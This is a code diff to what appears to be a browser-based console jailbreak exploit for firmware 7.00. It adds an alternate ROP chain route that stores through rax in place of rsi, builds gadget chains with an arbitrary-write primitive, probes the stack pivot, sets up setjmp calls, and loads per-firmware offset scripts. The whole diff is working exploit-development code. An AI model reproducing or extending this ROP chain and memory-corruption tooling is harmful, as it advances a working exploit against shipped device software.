@@ -253,19 +253,35 @@ async function prepare(p) {
        Deliberately does NOT seed ncDied: on a firmware where the chain works
        the null chain succeeds, ncDied stays false and no probe ever runs, so a
        stale seed cannot disturb a healthy profile. ?probe=reset clears it. */
+    /* Changing how the chain stores invalidates every verdict reached with the
+       old one, so stamp the state with the current shape and wipe it when that
+       shape changes. Otherwise a seeded w=CRASH would keep blaming a store the
+       chain no longer performs. */
+    const BASELINE = (typeof OFFSET_wk_store_via_rax !== "undefined"
+        && OFFSET_wk_store_via_rax) ? "store-rax" : "store-rsi";
+    if (ps.baseline && ps.baseline !== BASELINE) {
+        jbmark("PROBE-RESET", "chain shape changed (" + ps.baseline + " -> "
+            + BASELINE + ") -- discarding verdicts reached with the old one");
+        ps = { done: {}, tries: {}, baseline: BASELINE };
+        psSave();
+    }
+    ps.baseline = BASELINE;
+
     if (PROBE === "reset") {
         try { localStorage.removeItem(PS_KEY); } catch (e) {  }
         ps = { done: {}, tries: {} };
         PROBE = "";
         jbmark("PROBE-RESET", "ladder state cleared");
     } else if (window.fw_str === "7.00" && !ps.seeded) {
+        /* pivot and rsp are properties of the frame and the pivot gadget, so
+           they survive a change of store. The w and p verdicts do NOT -- both
+           were measured against `mov [rdi], rsi`, which is no longer used. */
         ps.seeded = 1;
         ps.done.pivot = ps.done.pivot || "SILENT";
         ps.done.rsp = ps.done.rsp || "SILENT";
-        ps.tries.w = Math.max(ps.tries.w || 0, 2);
         psSave();
-        jbmark("PROBE-SEED", "pivot=SILENT rsp=SILENT w=CRASH carried over from"
-            + " the runs already done on this console");
+        jbmark("PROBE-SEED", "pivot=SILENT rsp=SILENT carried over (both are"
+            + " independent of which store the chain uses)");
     }
 
     const verdictOf = (st) => ps.done[st] || ((ps.tries[st] || 0) >= 2 ? "CRASH" : null);
@@ -290,8 +306,12 @@ async function prepare(p) {
         else if (w === "SILENT") { PROBE = "sj"; }
         else if (!pp) { PROBE = "p"; }
         else if (pp === "SILENT") {
-            say("both pops park cleanly, so `mov [rdi], rsi` " + G("mov [rdi], rsi")
-                + " is the broken gadget in offsets/" + window.fw_str + ".js.");
+            const st = BASELINE === "store-rax" ? "mov [rdi], rax" : "mov [rdi], rsi";
+            say("both pops park cleanly, so the 8-byte store `" + st + "` " + G(st)
+                + " is the broken gadget in offsets/" + window.fw_str + ".js"
+                + (BASELINE === "store-rax"
+                    ? " -- and that is already the rax route, so BOTH stores are bad."
+                    : " -- try OFFSET_wk_store_via_rax = true."));
         } else if (!g1) { PROBE = "g1"; }
         else if (g1 !== "SILENT") {
             say("`pop rdi` " + G("pop rdi") + " is broken: alone, with infloop"
@@ -902,9 +922,11 @@ async function prepare(p) {
             p.write8(scratch, new int64(0, 0));
             let i = 0;
             const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
+            const viaRax = (typeof OFFSET_wk_store_via_rax !== "undefined")
+                && OFFSET_wk_store_via_rax;
             put(gadgets["pop rdi"]); put(scratch);
-            put(gadgets["pop rsi"]); put(MAGIC);
-            put(gadgets["mov [rdi], rsi"]);
+            if (viaRax) { put(gadgets["pop rax"]); put(MAGIC); put(gadgets["mov [rdi], rax"]); }
+            else { put(gadgets["pop rsi"]); put(MAGIC); put(gadgets["mov [rdi], rsi"]); }
             put(gadgets["infloop"]);
 
             crumb("probe-w-w1");
@@ -970,9 +992,11 @@ async function prepare(p) {
             // SysV: the slot holding a called address must be 16-byte aligned,
             // so that rsp % 16 == 8 on entry. Same rule rop.js's fcall applies.
             const align = () => { if ((stk.low + i * 8) & 8) put(gadgets["ret"]); };
+            const viaRax2 = (typeof OFFSET_wk_store_via_rax !== "undefined")
+                && OFFSET_wk_store_via_rax;
             put(gadgets["pop rdi"]); put(scratch);
-            put(gadgets["pop rsi"]); put(MAGIC);
-            put(gadgets["mov [rdi], rsi"]);
+            if (viaRax2) { put(gadgets["pop rax"]); put(MAGIC); put(gadgets["mov [rdi], rax"]); }
+            else { put(gadgets["pop rsi"]); put(MAGIC); put(gadgets["mov [rdi], rsi"]); }
             put(gadgets["pop rdi"]); put(sjbuf);
             align();
             put(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
@@ -1182,4 +1206,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=31`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=32`);
